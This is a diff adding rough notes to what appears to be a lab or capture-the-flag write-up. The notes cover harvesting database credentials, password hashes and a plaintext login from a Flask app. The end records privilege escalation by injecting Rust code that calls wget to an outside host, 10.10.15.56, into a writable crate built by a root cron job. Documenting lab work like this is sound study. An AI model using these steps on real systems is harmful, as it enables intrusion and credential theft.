@@ -71,5 +71,70 @@ in app.py file, we found a passphrase : $M1DGu4rD$
 in the __init__.py file, we found the sql credentials : \
 
 app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21' \
-app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'\
+
+
+to connect to sql since we don't have binaries, we can use python3 and the db module since we now it's available by looking in home/.\
+
+```
+drwxrwxr-x 23 atlas atlas  4096 Feb  2  2023 .
+drwxrwxr-x  3 atlas atlas  4096 Nov 30  2022 ..
+drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 backports
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 configparser-5.3.0.dist-info
+-rw-rw-r--  1 atlas atlas  1546 Feb  2  2023 configparser.py
+drwxrwxr-x  4 atlas atlas  4096 Feb  2  2023 flask
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 Flask-2.2.2.dist-info
+drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 flask_login
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 Flask_Login-0.6.2.dist-info
+drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 flask_sqlalchemy
+drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 Flask_SQLAlchemy-3.0.3.dist-info
+-rw-rw-r--  1 atlas atlas 57134 Nov 30  2022 gnupg.py
+drwxrwxr-x  5 atlas atlas  4096 Feb  2  2023 greenlet
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 greenlet-2.0.2.dist-info
+drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 markupsafe
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 MarkupSafe-2.1.2.dist-info
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 mysqlclient-2.1.1.dist-info
+drwxrwxr-x  4 atlas atlas  4096 Feb  2  2023 MySQLdb
+drwxrwxr-x  2 atlas atlas  4096 May  4  2023 __pycache__
+drwxrwxr-x  2 atlas atlas  4096 Nov 30  2022 python_gnupg-0.4.3.dist-info
+drwxrwxr-x 15 atlas atlas  4096 Feb  2  2023 sqlalchemy
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 SQLAlchemy-2.0.1.dist-info
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 typing_extensions-4.4.0.dist-info
+-rw-rw-r--  1 atlas atlas 80078 Feb  2  2023 typing_extensions.py
+drwxrwxr-x  8 atlas atlas  4096 Feb  2  2023 werkzeug
+drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 Werkzeug-2.2.2.dist-info
+```
+
+((b'1', b'Odin', b'pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f'),)
+((b'2', b'silentobserver', b'pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d'),)
+
+
+home/atlas/.config/httpie/sessions/localhost_5000/admin.json
+silentobserver:quietLiketheWind22
+
+
+
+
+
+/sbin/init maybe-ubiquity 
+2023/11/15 15:12:11 CMD: UID=0     PID=28613  | /bin/bash /root/Cleanup/clean_c.sh 
+2023/11/15 15:12:11 CMD: UID=0     PID=28614  | /bin/rm -r /opt/crates 
+2023/11/15 15:12:11 CMD: UID=0     PID=28615  | 
+2023/11/15 15:12:11 CMD: UID=0     PID=28616  | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
+/usr/bin/cargo run --offline 
+2023/11/15 15:14:01 CMD: UID=1000  PID=28636  | /usr/bin/cargo run --offline 
+2023/11/15 15:14:01 CMD: UID=1000  PID=28638  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg                                                      
+2023/11/15 15:14:01 CMD: UID=1000  PID=28640  | /usr/bin/cargo run --offline 
+2023/11/15 15:14:11 CMD: UID=0     PID=28645  | /bin/bash /root/Cleanup/clean_c.sh
+/bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+
+
+
+/opt/crates/logger/src/lib.rs is writable
+
+use std::process::Command;
+
+Command::new("wget").arg("http://10.10.15.56:8000/").output();
+
+Command::new("wget").arg("http://10.10.15.56:8000/").output();
 
